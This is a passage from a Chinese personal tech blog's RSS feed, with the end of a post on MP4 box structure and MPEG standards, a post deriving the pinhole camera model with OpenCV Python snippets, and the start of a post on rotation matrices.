&lt;td&gt;moov&lt;/td&gt;
&lt;td&gt;trak&lt;/td&gt;
&lt;td&gt;mdia&lt;/td&gt;
&lt;td&gt;minf&lt;/td&gt;
&lt;td&gt;stbl&lt;/td&gt;
&lt;td&gt;stsz&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;数据 box&lt;/td&gt;
&lt;td&gt;sample size, 每个 sample 的 size 信息&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;moov&lt;/td&gt;
&lt;td&gt;trak&lt;/td&gt;
&lt;td&gt;mdia&lt;/td&gt;
&lt;td&gt;minf&lt;/td&gt;
&lt;td&gt;stbl&lt;/td&gt;
&lt;td&gt;stts&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;数据 box&lt;/td&gt;
&lt;td&gt;time-to-sample，时间戳到 sample 的映射，每个 sample 的时长&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;moov&lt;/td&gt;
&lt;td&gt;trak&lt;/td&gt;
&lt;td&gt;mdia&lt;/td&gt;
&lt;td&gt;minf&lt;/td&gt;
&lt;td&gt;stbl&lt;/td&gt;
&lt;td&gt;stss&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;数据 box&lt;/td&gt;
&lt;td&gt;sync sampel table, 可以随机访问的 sample 列表（记录哪些 sample 是关键帧）&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;moov&lt;/td&gt;
&lt;td&gt;trak&lt;/td&gt;
&lt;td&gt;mdia&lt;/td&gt;
&lt;td&gt;minf&lt;/td&gt;
&lt;td&gt;stbl&lt;/td&gt;
&lt;td&gt;ctts&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;数据 box&lt;/td&gt;
&lt;td&gt;帧解码到渲染的时间差，针对 B 帧&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;5其他&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#5%e5%85%b6%e4%bb%96&#34;&gt;
        ##
    &lt;/a&gt;
    5.其他
&lt;/div&gt;
&lt;/h1&gt;
&lt;h2 id=&#34;51mpeg-7&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#51mpeg-7&#34;&gt;
        #
    &lt;/a&gt;
    5.1.MPEG-7
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;来自 wikipedia:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;MPEG-7并不是一个视频压缩标准，它是一个多媒体内容的描述标准。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;来自 mpeg.org:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;ISO/IEC 15938
Multimedia content description interface&lt;/p&gt;
&lt;p&gt;A suite of standards for description and search of audio, visual and multimedia content&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;52mpeg-21&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#52mpeg-21&#34;&gt;
        #
    &lt;/a&gt;
    5.2.MPEG-21
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;来自 wikipedia:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;MPEG-21标准的正式名称为“多媒体框架”,它致力于为多媒体传输和使用定义一个标准化的、可互操作的和高度自动化的开放框架，这个框架考虑到了对象化的多媒体接入以及使用不同的网络和终端进行传输等问题。 MPEG-21标准将各种不同协议、标准和技术融合在一起，透过这种统一环境对全球媒体资源进行统一和管理，进而完整著作权保护、用户隐私权保护、终端和网络资源撷取及事件报告等功能。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;来自 mpeg.org:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;ISO/IEC 21000
Multimedia framework&lt;/p&gt;
&lt;p&gt;A suite of standard that define a normative open framework for end-to-end multimedia creation, delivery and consumption that provides content creators, producers, distributors and service providers with equal opportunities in the MPEG-21 enabled open market, and also be to the benefit of the content consumers providing them access to a large variety of content in an interoperable manner.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&#34;6参考资料&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#6%e5%8f%82%e8%80%83%e8%b5%84%e6%96%99&#34;&gt;
        ##
    &lt;/a&gt;
    6.参考资料
&lt;/div&gt;
&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://zh.wikipedia.org/wiki/MPEG-1&#34;&gt;https://zh.wikipedia.org/wiki/MPEG-1&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://zh.wikipedia.org/wiki/MPEG-2&#34;&gt;https://zh.wikipedia.org/wiki/MPEG-2&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://zh.wikipedia.org/wiki/MPEG-3&#34;&gt;https://zh.wikipedia.org/wiki/MPEG-3&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://zh.wikipedia.org/wiki/MPEG-4&#34;&gt;https://zh.wikipedia.org/wiki/MPEG-4&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.mpeg.org/standards/MPEG-7/&#34;&gt;https://www.mpeg.org/standards/MPEG-7/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.mpeg.org/standards/MPEG-21/&#34;&gt;https://www.mpeg.org/standards/MPEG-21/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://zh.wikipedia.org/wiki/%E4%BA%92%E8%81%94%E7%BD%91%E5%AA%92%E4%BD%93%E7%B1%BB%E5%9E%8B&#34;&gt;https://zh.wikipedia.org/wiki/%E4%BA%92%E8%81%94%E7%BD%91%E5%AA%92%E4%BD%93%E7%B1%BB%E5%9E%8B&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://juejin.cn/post/6844904083904528392#heading-1&#34;&gt;https://juejin.cn/post/6844904083904528392#heading-1&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://slideplayer.com/slide/2409533/&#34;&gt;https://slideplayer.com/slide/2409533/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://zhuanlan.zhihu.com/p/402346767&#34;&gt;https://zhuanlan.zhihu.com/p/402346767&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.cnblogs.com/yinxiangpei/articles/2821954.html&#34;&gt;https://www.cnblogs.com/yinxiangpei/articles/2821954.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://zhuanlan.zhihu.com/p/355803589&#34;&gt;https://zhuanlan.zhihu.com/p/355803589&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    
    <item>
      <title>摄像机模型及实现</title>
      <link>/2022/05/%E6%91%84%E5%83%8F%E6%9C%BA%E6%A8%A1%E5%9E%8B%E5%8F%8A%E5%AE%9E%E7%8E%B0/</link>
      <pubDate>Sat, 07 May 2022 01:05:50 +0800</pubDate>
      <author>**Email:** [singleye512@gmail.com](mailto:singleye512@gmail.com) (singleye)</author>
      <guid>/2022/05/%E6%91%84%E5%83%8F%E6%9C%BA%E6%A8%A1%E5%9E%8B%E5%8F%8A%E5%AE%9E%E7%8E%B0/</guid>
      <description>&lt;!--toc--&gt;
&lt;p&gt;3D 设计软件和游戏中的图像经常是以一个观测者的角度展示的，可以把这个过程想象成一个人拿着一台摄像机在拍摄，在机器视觉中叫摄像机模型。&lt;/p&gt;
&lt;p&gt;研究过程中基于 OpenCV 做了一个简单实现，项目代码可以在这里下载到 &lt;a href=&#34;https://github.com/singleye/camera-model&#34;&gt;“github 代码下载”&lt;/a&gt;，欢迎大家下载交流。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://www.singleye.net/media/2022/05/camera-model-1.png&#34; alt=&#34;camera&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;摄像机模型的数学模型&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e6%91%84%e5%83%8f%e6%9c%ba%e6%a8%a1%e5%9e%8b%e7%9a%84%e6%95%b0%e5%ad%a6%e6%a8%a1%e5%9e%8b&#34;&gt;
        ##
    &lt;/a&gt;
    摄像机模型的数学模型
&lt;/div&gt;
&lt;/h1&gt;
&lt;h2 id=&#34;座标系&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e5%ba%a7%e6%a0%87%e7%b3%bb&#34;&gt;
        #
    &lt;/a&gt;
    座标系
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;理解摄像机模型需要建立对应的座标系，在这个模型里面涉及到了下面 3 个座标系：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;世界座标系 (World frame)&lt;/p&gt;
&lt;p&gt;被观测目标存在于世界座标系中，使用世界座标系座标表示位置，是个 3 维座标系，可以使用常用的单位，比如‘米’。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;相机座标系 (Camera frame)&lt;/p&gt;
&lt;p&gt;通常使用摄像机的光学中心为原点，是一个 3 维座标系，表示从相机的光学中心原点来衡量各个目标的位置，尺度可以保持和世界座标系统一，比如都使用‘米’；相机可以移动到世界座标系中的任意位置和任意角度（姿态）。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;像平面座标系 (Image plane frame)&lt;/p&gt;
&lt;p&gt;这是最终观测的图像座标系，是一个 3 维座标系，在相机中是 CCD 的座标系，例如以左上角为原点，尺度为‘像素’。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;http://www.singleye.net/media/2022/05/camera-model-2.png&#34; alt=&#34;coordinate&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;座标转换&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e5%ba%a7%e6%a0%87%e8%bd%ac%e6%8d%a2&#34;&gt;
        #
    &lt;/a&gt;
    座标转换
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;当移动摄像机时，摄像机成像的结果可以通过座标转换来完成：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;把世界座标系中的物体座标进行&amp;rsquo;座标系变换&amp;rsquo;，转换成相机座标系中的座标&lt;/li&gt;
&lt;li&gt;通过相机内参转换到像平面座标系&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;座标系变换过程&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e5%ba%a7%e6%a0%87%e7%b3%bb%e5%8f%98%e6%8d%a2%e8%bf%87%e7%a8%8b&#34;&gt;
        ##
    &lt;/a&gt;
    座标系变换过程
&lt;/div&gt;
&lt;/h3&gt;
&lt;p&gt;世界座标 $O_w$ 用下面形式表示:&lt;/p&gt;
$$
\left(
	\begin{matrix}
		X_w \\
		Y_w \\
		Z_w
	\end{matrix}
\right)
$$
&lt;p&gt;摄像机在世界座标系中被移动到 $t$ 位置：&lt;/p&gt;
$$
\left(
	\begin{matrix}
		x_t \\
		y_t \\
		z_t
	\end{matrix}
\right)
$$
&lt;p&gt;&lt;strong&gt;第一步&lt;/strong&gt;：先抵消掉摄像机的空间移动 $t$，也就是 $O_w - t$。这一步后新的座标系与摄像机座标系原点重叠。&lt;/p&gt;
&lt;div&gt;
$$
\left(
	\begin{matrix}
		O_w - t
	\end{matrix}
\right)=
\left(
	\begin{matrix}
		X_w - t_x \\\
		Y_w - t_y \\\
		Z_w - t_z
	\end{matrix}
\right)
$$
&lt;/div&gt;
&lt;p&gt;&lt;img src=&#34;http://www.singleye.net/media/2022/05/camera-model-3.png&#34; alt=&#34;Step1&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;第二步&lt;/strong&gt;：旋转座标系第一步后的新座标系到摄像机座标座标系，旋转矩阵 $R$ ，关于座标旋转参见&lt;a href=&#34;http://www.singleye.net/2021/01/%E6%97%8B%E8%BD%AC%E7%9F%A9%E9%98%B5/&#34;&gt;旋转矩阵&lt;/a&gt;，完成旋转后得到了摄像机座标系下的座标 $O_c$&lt;/p&gt;
&lt;div&gt;
$$
O_c =
R*
\left(
		O_w - t
\right)=
R*
\left(
	\begin{matrix}
		X_w - t_x \\\
		Y_w - t_y \\\
		Z_w - t_z
	\end{matrix}
\right)
=
\left(
	\begin{matrix}
		X_c \\\
		Y_c \\\
		Z_c
	\end{matrix}
\right)
$$
&lt;/div&gt;
&lt;p&gt;&lt;img src=&#34;http://www.singleye.net/media/2022/05/camera-model-4.png&#34; alt=&#34;Step2&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;相机座标转化到像平面座标&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e7%9b%b8%e6%9c%ba%e5%ba%a7%e6%a0%87%e8%bd%ac%e5%8c%96%e5%88%b0%e5%83%8f%e5%b9%b3%e9%9d%a2%e5%ba%a7%e6%a0%87&#34;&gt;
        ##
    &lt;/a&gt;
    相机座标转化到像平面座标
&lt;/div&gt;
&lt;/h3&gt;
&lt;p&gt;先看一下小孔成像模型，使用虚拟像平面可以把座标转换简化。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://www.singleye.net/media/2022/05/camera-model-6.png&#34; alt=&#34;虚拟像平面&#34;&gt;&lt;/p&gt;
&lt;p&gt;简化后的模型如下图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://www.singleye.net/media/2022/05/camera-model-5.png&#34; alt=&#34;Step3&#34;&gt;&lt;/p&gt;
&lt;p&gt;摄像机座标系与虚拟像平面交于点 $(x_o, y_o)$，摄像机座标系下的点 $O_c$ 在虚拟像平面上的投影点是 $(x&amp;rsquo;, y&amp;rsquo;)$&lt;/p&gt;
&lt;p&gt;通过相似三角形可以容易得到：$ x&amp;rsquo; \over X_c $ = $ y&amp;rsquo; \over Y_c $ = $ f \over Z_c $，也就是：&lt;/p&gt;
$$ x‘ = f \frac {X_c} {Z_c} $$
$$ y’ = f \frac {Y_c} {Z_c} $$
$$ z‘ = f \frac {Z_c} {Z_c} $$
&lt;div&gt;
$$
\left(
	\begin{matrix}
		x&#39; \\\
		y&#39; \\\
		f
	\end{matrix}
\right)=
f/Z
\left(
	\begin{matrix}
		X_c \\\
		Y_c \\\
		Z_c
	\end{matrix}
\right)
$$
&lt;/div&gt;
&lt;p&gt;在摄像机虚拟像平面座标系下（左上角为原点，像素为单位），摄像机座标系与虚拟像平面的交点像素座标为 $(x_o, y_o)$，摄像机座标系下的点 $O_c$ 在虚拟像平面上投影点像素级座标是 $(x, y)$，摄像机 CCD 的像素点在 x 和 y 轴方向上的排列密度为 $\sigma_x$ （单位：pixels/meter）和 $\sigma_y$ （单位：pixels/meter），那么：&lt;/p&gt;
&lt;div&gt;
$$
\left(
	\begin{matrix}
		x&#39; \\\
		y&#39; \\\
		f
	\end{matrix}
\right)=
\left(
	\begin{matrix}
		\frac {x - x_o} {\sigma_x} \\\
		\frac {y - x_o} {\sigma_y} \\\
		f
	\end{matrix}
\right)=
f/Z
\left(
	\begin{matrix}
		X_c \\\
		Y_c \\\
		Z_c
	\end{matrix}
\right)
$$
&lt;/div&gt;
&lt;p&gt;中间式子可以写成下面形式：&lt;/p&gt;
&lt;div&gt;
$$
\left(
	\begin{matrix}
		\frac {x - x_o} {\sigma_x} \\\
		\frac {y - x_o} {\sigma_y} \\\
		f
	\end{matrix}
\right)=
\left(
	\begin{matrix}
		\frac 1 {\sigma_x}		&amp;	0	&amp;	0 \\\
		0	&amp;	\frac 1 {\sigma_y}	&amp;	0 \\\
		0	&amp;	0				&amp;		1
	\end{matrix}
\right)
\left(
	\begin{matrix}
		x - x_o \\\
		y - y_o \\\
		f
	\end{matrix}
\right)=
f/Z
\left(
	\begin{matrix}
		X_c \\\
		Y_c \\\
		Z_c
	\end{matrix}
\right)
$$
&lt;/div&gt;
&lt;p&gt;通过逆矩阵运算得到：&lt;/p&gt;
&lt;div&gt;
$$
\left(
	\begin{matrix}
		x - x_o \\\
		y - y_o \\\
		f
	\end{matrix}
\right)=
f/Z
\left(
	\begin{matrix}
		\sigma_x		&amp;	0	&amp;	0 \\\
		0	&amp;	\sigma_y	&amp;	0 \\\
		0	&amp;	0				&amp;		1
	\end{matrix}
\right)
\left(
	\begin{matrix}
		X_c \\\
		Y_c \\\
		Z_c
	\end{matrix}
\right)
$$
&lt;/div&gt;
&lt;p&gt;再把第一个矩阵拆成下面的形式：&lt;/p&gt;
&lt;div&gt;
$$
\left(
	\begin{matrix}
		x - x_o \\\
		y - y_o \\\
		f
	\end{matrix}
\right)=
\left(
	\begin{matrix}
		1	&amp;	0	&amp;	-\frac {x_o} f 	\\\
		0	&amp;	1	&amp;	-\frac {y_o} f	\\\
		0	&amp;	0	&amp;	1
	\end{matrix}
\right)
\left(
	\begin{matrix}
		x \\\
		y \\\
		f
	\end{matrix}
\right)=
f/Z
\left(
	\begin{matrix}
		\sigma_x		&amp;	0	&amp;	0 \\\
		0	&amp;	\sigma_y	&amp;	0 \\\
		0	&amp;	0				&amp;		1
	\end{matrix}
\right)
\left(
	\begin{matrix}
		X_c \\\
		Y_c \\\
		Z_c
	\end{matrix}
\right)
$$
&lt;/div&gt;
&lt;p&gt;再做矩阵逆运算得到：&lt;/p&gt;
&lt;div&gt;
$$
\left(
	\begin{matrix}
		x \\\
		y \\\
		f
	\end{matrix}
\right)=
f/Z
\left(
	\begin{matrix}
		1	&amp;	0	&amp;	\frac {x_o} f 	\\\
		0	&amp;	1	&amp;	\frac {y_o} f	\\\
		0	&amp;	0	&amp;	1
	\end{matrix}
\right)
\left(
	\begin{matrix}
		\sigma_x		&amp;	0	&amp;	0 \\\
		0	&amp;	\sigma_y	&amp;	0 \\\
		0	&amp;	0				&amp;		1
	\end{matrix}
\right)
\left(
	\begin{matrix}
		X_c \\\
		Y_c \\\
		Z_c
	\end{matrix}
\right)=
1/Z
\left(
	\begin{matrix}
		f \sigma_x	&amp;	0				&amp;	x_o \\\
		0				&amp;	f \sigma_y	&amp;	y_o \\\
		0				&amp;	0				&amp;	1
	\end{matrix}
\right)
\left(
	\begin{matrix}
		X_c \\\
		Y_c \\\
		Z_c
	\end{matrix}
\right)
$$
&lt;/div&gt;
&lt;h2 id=&#34;摄像机数学模型&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e6%91%84%e5%83%8f%e6%9c%ba%e6%95%b0%e5%ad%a6%e6%a8%a1%e5%9e%8b&#34;&gt;
        #
    &lt;/a&gt;
    摄像机数学模型
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;现在已经有了一个摄像机的数学模型：&lt;/p&gt;
&lt;p&gt;**第一步：**把观察目标从世界坐标旋转到摄像机坐标&lt;/p&gt;
&lt;div&gt;
$$
O_c =
R*
\left(
		O_w - t
\right)=
R*
\left(
	\begin{matrix}
		X_w - t_x \\\
		Y_w - t_y \\\
		Z_w - t_z
	\end{matrix}
\right)
=
\left(
	\begin{matrix}
		X_c \\\
		Y_c \\\
		Z_c
	\end{matrix}
\right)
$$
&lt;/div&gt;
&lt;p&gt;**第二步：**把摄像机坐标转换到摄像机虚拟像平面像素坐标&lt;/p&gt;
&lt;div&gt;
$$
\left(
	\begin{matrix}
		x \\\
		y \\\
		f
	\end{matrix}
\right)=
&lt;p&gt;1/Z
\left(
\begin{matrix}
f \sigma_x	&amp;amp;	0				&amp;amp;	x_o \\
0				&amp;amp;	f \sigma_y	&amp;amp;	y_o \\
0				&amp;amp;	0				&amp;amp;	1
\end{matrix}
\right)
\left(
\begin{matrix}
X_c \\
Y_c \\
Z_c
\end{matrix}
\right)
$$&lt;/p&gt;
&lt;/div&gt;
&lt;h1 id=&#34;实现一个摄像机模型&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e5%ae%9e%e7%8e%b0%e4%b8%80%e4%b8%aa%e6%91%84%e5%83%8f%e6%9c%ba%e6%a8%a1%e5%9e%8b&#34;&gt;
        ##
    &lt;/a&gt;
    实现一个摄像机模型
&lt;/div&gt;
&lt;/h1&gt;
&lt;p&gt;**第一步：**世界坐标系到相机坐标系转换&lt;/p&gt;
&lt;p&gt;根据摄像机旋转角度计算出旋转矩阵 R：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;      def rotate(self, roll, pitch, yaw):
          &amp;#39;&amp;#39;&amp;#39;
          Rotate camera by roll, pitch, yaw
          &amp;#39;&amp;#39;&amp;#39;
          rx, _ = cv2.Rodrigues((pitch, 0, 0))
 Rodrigues(src, dst=None, jacobian=None, /) -&amp;gt; dst, jacobian                                                                            
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;被观测物体的世界坐标转换到相机坐标：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;      def trans_to_cam(self, v):
          &amp;#39;&amp;#39;&amp;#39;
          Transform the world coordinate vertices to camera coordinate vertices
              v: vertices in world coordinate frame
          &amp;#39;&amp;#39;&amp;#39;
          vc = np.dot(self.R, (v.T - np.array([[self._x], [self._y], [self._z]])))
          return vc.T
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;**第二步：**把相机坐标投影到相机虚拟像平面上&lt;/p&gt;
&lt;p&gt;定义相机内参：包括焦距、CCD像素密度参数，写出相机内参矩阵&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;          # camera focus length in meter
          self._f = 1

          # scale factor: pixels/meter
          self._s = 800
          
          # camera intrinsic matrix
          self.intrinsic = np.array([[self._f*self._s,    0,                  self._canvas_width/2.0],
                                     [0,                  self._f*self._s,    self._canvas_height/2.0],
                                     [0,                  0,                  1]])
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;进行投影转换计算。**注：**由于程序实现时世界/相机坐标系采用的是右手Z轴向前的形式，因此计算结果多了一步转换的运算。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;      def project(self, v):
          &amp;#39;&amp;#39;&amp;#39;
          Project the vertices of camera coordinate to camera image plane coordinate
              v: vertices in camera coordinate frame
                  u = width - f*(Y/X)
                  v = height - f*(Z/X)
          &amp;#39;&amp;#39;&amp;#39;
          Z = np.expand_dims(v[:, -1], axis=1)
          proj_v = np.dot(self.intrinsic, v.T) / Z
          proj_v = proj_v.T
          proj_v[:, 0:2] = [self._canvas_width, self._canvas_height] - proj_v[:, 0:2]
          return proj_v[:, :2]
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Demo：&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;video_container&#34;&gt;
  &lt;video controls=&#34;true&#34; allowfullscreen=&#34;true&#34; poster=&#34;https://raw.githubusercontent.com/singleye/camera-model/master/examples/camera-model-1.png&#34; width=&#34;400&#34; height=&#34;300&#34;&gt;
    &lt;source src=&#34;https://raw.githubusercontent.com/singleye/camera-model/master/examples/demo.m4v&#34; type=&#34;video/mp4&#34;&gt;
  &lt;/video&gt;
&lt;/figure&gt;
&lt;h1 id=&#34;参考&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e5%8f%82%e8%80%83&#34;&gt;
        ##
    &lt;/a&gt;
    参考
&lt;/div&gt;
&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/CV-xueba/A01_cvclass_basic&#34;&gt;CS231A 鲁鹏&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://kth.instructure.com/courses/6163&#34;&gt;DD2429 from KTH&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    
    <item>
      <title>旋转矩阵</title>
      <link>/2021/01/%E6%97%8B%E8%BD%AC%E7%9F%A9%E9%98%B5/</link>
      <pubDate>Thu, 07 Jan 2021 11:40:47 +0800</pubDate>
      <author>**Email:** [singleye512@gmail.com](mailto:singleye512@gmail.com) (singleye)</author>
      <guid>/2021/01/%E6%97%8B%E8%BD%AC%E7%9F%A9%E9%98%B5/</guid>
      <description>&lt;!--toc--&gt;
&lt;p&gt;计算机图形学中的仿射变换包括平移、缩放、旋转等，在机器人位置描述的时候也需要使用到平移、旋转。这里主要介绍旋转的处理方法。&lt;/p&gt;
&lt;h1 id=&#34;先举个简单例子&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e5%85%88%e4%b8%be%e4%b8%aa%e7%ae%80%e5%8d%95%e4%be%8b%e5%ad%90&#34;&gt;
        ##
    &lt;/a&gt;
    先举个简单例子
&lt;/div&gt;
&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;http://www.singleye.net/media/2021/01/rotation.png&#34; alt=&#34;rotation&#34;&gt;&lt;/p&gt;
&lt;p&gt;设想一个二维平面空间里的“一个点”状机器人的简单情况，最初机器人位于平面直角坐标系中的 (1, 0) 点，先让机器人围绕着原点旋转角度 $\phi$ ，那么机器人的新的位置坐标可以很容易的用以下方式来表示:&lt;/p&gt;
$$ (cos(\phi), sin(\phi)) $$
&lt;p&gt;让机器人再从刚才的位置继续旋转 $\theta$ 角，那么机器人的新的位置坐标也很直观的用下面式子表示：&lt;/p&gt;
$$ (cos(\phi+\theta), sin(\phi+\theta)) $$
&lt;h1 id=&#34;复杂一点的例子&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e5%a4%8d%e6%9d%82%e4%b8%80%e7%82%b9%e7%9a%84%e4%be%8b%e5%ad%90&#34;&gt;
        ##
    &lt;/a&gt;
    复杂一点的例子
&lt;/div&gt;
&lt;/h1&gt;
&lt;p&gt;在平面直角坐标系下，如果机器人不再是一个简单的点而是一个平面，那么机器人躯干中的任意一个点 (x, y) 经过旋转后在原平面直角坐标系下的新坐标是什么？&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://www.singleye.net/media/2021/01/example-1.png&#34; alt=&#34;rotation&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;旋转矩阵&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e6%97%8b%e8%bd%ac%e7%9f%a9%e9%98%b5&#34;&gt;
        ##
    &lt;/a&gt;
    旋转矩阵
&lt;/div&gt;
&lt;/h1&gt;
&lt;h2 id=&#34;二维平面直角坐标系旋转矩阵推导&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e4%ba%8c%e7%bb%b4%e5%b9%b3%e9%9d%a2%e7%9b%b4%e8%a7%92%e5%9d%90%e6%a0%87%e7%b3%bb%e6%97%8b%e8%bd%ac%e7%9f%a9%e9%98%b5%e6%8e%a8%e5%af%bc&#34;&gt;
        #
    &lt;/a&gt;
    二维平面直角坐标系旋转矩阵推导
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;http://www.singleye.net/media/2021/01/rotation.png&#34; alt=&#34;rotation&#34;&gt;&lt;/p&gt;
&lt;p&gt;机器人躯干上的任意点 (x, y) 对应向量 v，旋转 $\theta$ 后的位置计作 (x&amp;rsquo;, y&amp;rsquo;)对应新的向量 v&amp;rsquo;。&lt;/p&gt;
&lt;p&gt;那么：&lt;/p&gt;
&lt;div&gt;
$$
\left( 
	\begin{matrix}
		x \\
		y
	\end{matrix}
\right)=
\left( 
	\begin{matrix}
		r*cos(\phi) \\
		r*sin(\phi)
	\end{matrix}
\right)
$$
&lt;/div&gt;
&lt;div&gt;
$$
\left( 
	\begin{matrix}
		x&#39; \\
		y&#39;
	\end{matrix}
\right)=
\left( 
	\begin{matrix}
		r*cos(\phi+\theta) \\
		r*sin(\phi+\theta)
	\end{matrix}
\right)
$$
&lt;/div&gt;
&lt;p&gt;三角和差化积公式:&lt;/p&gt;
$$ cos(\phi+\theta) = cos(\phi)*cos(\theta) - sin(\phi)*sin(\theta) $$
$$ sin(\phi+\theta) = sin(\phi)*cos(\theta) + cos(\phi)*sin(\theta) $$
&lt;p&gt;带入和差化积公式后：&lt;/p&gt;
&lt;div&gt;
$$
\left( 
	\begin{matrix}
		x&#39; \\
		y&#39;
	\end{matrix}
\right)=
\left( 
	\begin{matrix}
		r*cos(\phi)*cos(\theta) - r*sin(\phi)*sin(\theta) \\
		r*sin(\phi)*cos(\theta) + r*cos(\phi)*sin(\theta)
	\end{matrix}
\right)=
\left( 
	\begin{matrix}
		x*cos(\theta) - y*sin(\theta) \\
		y*cos(\theta) + x*sin(\theta)
	\end{matrix}
\right)
$$
&lt;/div&gt;
&lt;p&gt;用矩阵的方法书写上面的公式：&lt;/p&gt;
&lt;div&gt;
$$
\left( 
	\begin{matrix}
		x&#39; \\
		y&#39;
	\end{matrix}
\right)=
\left( 
	\begin{matrix}
		cos(\theta) &amp; -sin(\theta) \\
		sin(\theta) &amp; cos(\theta)
	\end{matrix}
\right)*
\left( 
	\begin{matrix}
		x \\
		y
	\end{matrix}
\right)
$$
&lt;/div&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;旋转矩阵 &amp;lsquo;R&amp;rsquo;：&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;div&gt;
$$
R=
\left( 
	\begin{matrix}
		cos(\theta) &amp; -sin(\theta) \\
		sin(\theta) &amp; cos(\theta)
	\end{matrix}
\right)
$$
&lt;/div&gt;
&lt;h2 id=&#34;二维平面之交坐标系旋绕任一点旋转&#34; &gt;
&lt;div&gt;
